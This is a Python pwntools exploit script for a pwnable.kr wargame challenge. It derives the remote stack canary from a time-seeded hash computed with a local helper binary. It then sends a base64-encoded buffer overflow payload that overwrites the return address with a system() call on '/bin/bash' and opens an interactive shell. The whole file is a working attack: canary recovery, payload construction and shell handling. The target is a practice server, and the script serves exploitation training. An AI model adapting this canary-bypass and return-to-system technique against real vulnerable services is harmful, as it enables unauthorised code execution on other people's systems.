import math
from pwn import *
import subprocess
from pathlib import Path
from encodings.base64_codec import base64_encode
from datetime import datetime, timedelta, timezone

# Shell command to run
SHELL_COMMAND = b'/bin/bash'   

BASE_PATH = Path(__file__).parent
CALCULATE_HASH_BINARY = Path(BASE_PATH, 'calculate_hash', 'calculate_hash')

G_BUF_ADDRESS = 0x804b0e0
BUFFER_SIZE = 0x200

ESP_ADDRESS_BEFORE_SYSTEM_CALLED = 0xffffd170

# Add 4 since the pointer to the shell command is also stored
# in the stack
SHELL_COMMAND_ADDRESS = ESP_ADDRESS_BEFORE_SYSTEM_CALLED + 4

SYSTEM_CALL_ADDRESS = 0x8049187

def calculate_hash(time_diff: int) -> int:
    """
    Calculates a custom hash (exactly like the binary does) without the canary.
    """
    time = math.floor(datetime.now().timestamp() + time_diff)
    popen = subprocess.Popen([CALCULATE_HASH_BINARY, str(time)], stdout=subprocess.PIPE)
    result, _ = popen.communicate()

    return int(result.decode())

def calculate_canary(original_hash: int, time_diff: int = 0) -> int:
    """
    Calculate the remote thread canary by calculating the hash in house,
    and then substracting it from the original hash. This results the canary

    (Discovered by reverse engineering the my_hash function)
    """
    return (original_hash - calculate_hash(time_diff)) & 0xFFFFFFFF

def calculate_base64_length(original_length: int) -> int:
    """
    Calculate the length of base64 encoded value from it's original length
    """
    return 4 * math.ceil(original_length / 3)    

def main() -> None:
    # Iterate over several time diffs since there's a changing delay between connecting to 
    # the pwnable.kr server and generating the hash locally. Since the timestamp for generating
    # the hash must be the exact same as the remote.
    for time_diff in range(-5, 1):
      
        # Get the original hash
        connection = remote('pwnable.kr', 9002)
        
        # Get the captcha (hash) from the connection
        connection.readuntil(':')
        original_hash = int(connection.read().decode().strip())

        # Calculate the canary value
        canary = calculate_canary(original_hash, time_diff)

        # Response to the captcha
        connection.sendline(str(original_hash).encode())

        # Craft the payload and send it
        payload = b'A' * BUFFER_SIZE + p32(canary) + 12 * b'A' + p32(SYSTEM_CALL_ADDRESS)
        payload += p32(G_BUF_ADDRESS + calculate_base64_length(len(payload) + 4))
        payload = base64_encode(payload)[0].replace(b'\n', b'') + SHELL_COMMAND
        connection.sendline(payload)

        # Receive 4 lines, which actually means, read until received stack smashing detected.
        # If the timeout reached and 4 lines were not received, We managed to open a shell :)
        output = b'\n'.join(connection.recvlines(4, timeout=3)).decode()

        if 'stack smashing detected' not in output:
            # Make interactive to get the gained shell :)
            connection.interactive()
            break
        else:
            print(f'with diff {time_diff}: Stack smashing detected :(')


if __name__ == '__main__':
    main()
